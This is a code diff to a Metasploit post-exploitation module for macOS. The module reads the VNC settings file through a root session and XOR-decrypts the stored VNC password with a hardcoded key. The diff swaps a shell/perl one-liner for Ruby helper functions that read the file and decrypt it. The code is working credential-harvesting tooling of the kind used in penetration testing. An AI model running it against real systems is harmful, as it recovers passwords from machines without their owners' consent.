@@ -23,6 +23,35 @@ class MetasploitModule < Msf::Post
 
   end
 
+  def decrypt_hash(hash)
+    if hash == nil or hash.empty?
+      return nil
+    end
+
+    aux = ["1734516E8BA8C5E2FF1C39567390ADCA"].pack('H*')
+    fixedkey = aux.unpack('C*')
+
+    str_pw = ["#{hash}"].pack('H*')
+    array_pwd = str_pw.unpack('C*')
+    str = ''
+
+    for data in fixedkey;
+      str += (data ^ array_pwd.shift).chr
+    end
+    return str
+  end
+
+  def getFile(filename)
+    begin
+      client.fs.file.stat(filename)
+      config = client.fs.file.new(filename,'r')
+      value = config.read
+      return value
+    rescue
+      return nil
+    end
+  end
+
   def run
     case session.type
     when /meterpreter/
@@ -32,19 +61,18 @@ class MetasploitModule < Msf::Post
     end
 
     print_status("Running module against #{host}")
-
     unless is_root?
       fail_with(Failure::NoAccess, 'It is necessary to be root!')
     end
     print_status("This session is running as root!")
-
     print_status("Checking VNC Password...")
     vncsettings_path = '/Library/Preferences/com.apple.VNCSettings.txt'
-    if file_exist? vncsettings_path
-      password = cmd_exec("cat #{vncsettings_path} | perl -wne 'BEGIN { @k = unpack \"C*\", pack \"H*\", \"1734516E8BA8C5E2FF1C39567390ADCA\"}; chomp; @p = unpack \"C*\", pack \"H*\", $_; foreach (@k) { printf\"%c\", $_ ^ (shift @p || 0) };'")
-      print_good("Password Found: #{password}")
+    passwd_encrypt = getFile("#{vncsettings_path}")
+    final_passwd = decrypt_hash("#{passwd_encrypt}")
+    if !final_passwd.nil?
+      print_good("Password Found: #{final_passwd}")
     else
-      print_error("The VNC Password has not been found")
+      print_error("Password not found")
     end
   end
 end
